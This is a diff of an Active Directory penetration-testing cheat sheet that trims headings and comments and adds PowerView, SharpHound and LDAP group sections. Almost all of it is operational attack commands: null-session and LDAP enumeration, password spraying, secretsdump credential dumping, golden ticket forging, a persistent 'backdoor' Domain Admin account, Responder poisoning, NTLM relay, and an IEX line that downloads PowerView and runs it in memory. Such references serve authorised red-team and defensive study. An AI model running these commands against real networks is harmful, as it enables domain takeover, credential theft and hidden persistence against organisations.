@@ -1,49 +1,45 @@
-## Identify if target is domain-joined
+## Discover domain name
 ```bash
-nmap -p 88,389,636,3268,3269 $IP
-```
-
-## Discover domain name via reverse DNS
-```bash
-# nslookup OR dig -x
 nslookup $IP
 ```
 
-## Discover NetBIOS domain name
+## Discover NetBIOS name
 ```bash
-# nbtscan OR nmblookup -A
 nbtscan $IP
 ```
 
-## Test anonymous LDAP binding and extract users
+## LDAP extract users
 ```bash
 ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=*)" | head -20
 ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName | cut -d: -f2 | sort > users.txt
 ```
 
-## Extract computers from anonymous LDAP
+## LDAP extract computers
 ```bash
 ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=computer)" dNSHostName | grep dNSHostName | cut -d: -f2 | sort > computers.txt
 ```
 
-## Test SMB null sessions for share enumeration
+## LDAP extract groups
 ```bash
-# -u '' for null OR -u 'guest' for guest; add --users for user enum
+ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=group)" cn | grep "cn:" | cut -d: -f2
+```
+
+## SMB null session shares
+```bash
 netexec smb $IP -u '' -p '' --shares
 ```
 
-## Enumerate domain with enum4linux-ng via null session
+## enum4linux-ng null session
 ```bash
 enum4linux-ng -A $IP
 ```
 
-## Test RPC null session and enumerate users
+## RPC null session
 ```bash
-# Add -c "enumdomusers" OR -c "enumdomgroups" OR -c "querydominfo"
 rpcclient -U "" -N $IP
 ```
 
-## Create common AD password list for spraying
+## Create password list
 ```bash
 cat > passwords.txt << 'EOF'
 Password123!
@@ -54,63 +50,59 @@ CompanyName2024!
 EOF
 ```
 
-## Password spray with NetExec
+## Password spray
 ```bash
-# -p 'Password123!' for single OR -p passwords.txt for file
-# Change protocol: smb, ldap, OR winrm
 netexec smb $IP -u users.txt -p passwords.txt --continue-on-success
 ```
 
-## Test cracked service account credentials across domain
+## Test credentials across domain
 ```bash
-# Test smb --shares OR winrm for shell access
 netexec smb $IP -u serviceaccount -p crackedpassword --shares
 ```
 
-## Dump domain credentials with secretsdump
-Add -just-dc for DC hashes only OR -just-dc-ntlm for NTLM only
+## Dump domain credentials
 ```bash
 impacket-secretsdump domain.local/username:password@$IP
 ```
 
-## Dump domain credentials from SAM and SYSTEM locally
+## Dump SAM and SYSTEM locally
 ```
 impacket-secretsdump -sam SAM -system -SYSTEM LOCAL
 ```
 
-## Create golden ticket with krbtgt hash
+## Create golden ticket
 ```bash
 impacket-ticketer -nthash aad3b435b51404eeaad3b435b51404ee -domain domain.local -domain-sid S-1-5-21-1234567890-1234567890-1234567890 administrator
 ```
 
-## Create persistent domain admin account
+## Create domain admin account
 ```cmd
 net user backdoor Password123! /add /domain
 net group "Domain Admins" backdoor /add /domain
 ```
 
-## Check for SMB relay opportunities
+## Check SMB relay targets
 ```bash
 netexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
 ```
 
-## Run Responder for LLMNR/NBT-NS poisoning
+## Run Responder
 ```bash
 responder -I eth0 -wrf
 ```
 
-## Setup ntlmrelayx for SMB relay attacks
+## Setup ntlmrelayx
 ```bash
 impacket-ntlmrelayx -tf targets.txt -smb2support
 impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
 ```
 
-## Download PowerView on Windows target
+## Download PowerView
 ```powershell
 IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
 ```
 
-## Enumerate domain with PowerView
+## PowerView enumerate domain
 ```powershell
 Get-Domain
 Get-DomainController
@@ -119,57 +111,76 @@ Get-DomainGroup
 Get-DomainComputer
 ```
 
-## Find computers with unconstrained delegation
+## PowerView find unconstrained delegation
 ```powershell
 Get-DomainComputer -Unconstrained
 ```
 
-## Find users with SPN for Kerberoasting
+## PowerView find SPN users
 ```powershell
 Get-DomainUser -SPN
 ```
 
-## Find domain shares accessible by current user
+## PowerView find accessible shares
 ```powershell
 Find-DomainShare -CheckShareAccess
 ```
 
-## Find local admin access on domain computers
+## PowerView find local admin access
 ```powershell
 Find-LocalAdminAccess
 Test-AdminAccess
 ```
 
-## Enumerate domain trusts
+## PowerView enumerate trusts
 ```powershell
 Get-DomainTrust
 Get-DomainTrustMapping
 ```
 
-## Get domain password policy
+## PowerView enumerate GPOs
+```powershell
+Get-DomainGPO
+Get-DomainGPO | Select-Object displayname,gpcfilesyspath
+```
+
+## PowerView (Kali Source)
+```
+/usr/share/windows-resources/powersploit/Recon/PowerView.ps1
+```
+
+## SharpHound (Kali Source)
+```
+/usr/share/sharphound/SharpHound.exe
+```
+
+## Run SharpHound
+```cmd
+.\SharpHound.exe -c All -d domain.local --zipfilename bloodhound.zip
+```
+
+## Get password policy
 ```bash
-# Use smb with --pass-pol OR ldap with --password-policy
 netexec smb $IP -u username -p password --pass-pol
 ```
 
-## Enumerate with ldapdomaindump
+## Run ldapdomaindump
 ```bash
 ldapdomaindump -u 'domain.local\username' -p password $IP
 ```
 
-## Check for MS17-010 EternalBlue on domain controllers
+## Check MS17-010 EternalBlue
 ```bash
 nmap -p 445 --script smb-vuln-ms17-010 $IP
 ```
 
-## Password spray across subnet range
+## Password spray subnet
 ```bash
 netexec smb 10.10.10.0/24 -u users.txt -p 'Password123!' --continue-on-success
 ```
 
-## Test administrative access across multiple hosts
+## Test admin access multiple hosts
 ```bash
-# Change protocol: smb OR winrm
 netexec smb 10.10.10.0/24 -u administrator -p password
 ```
 
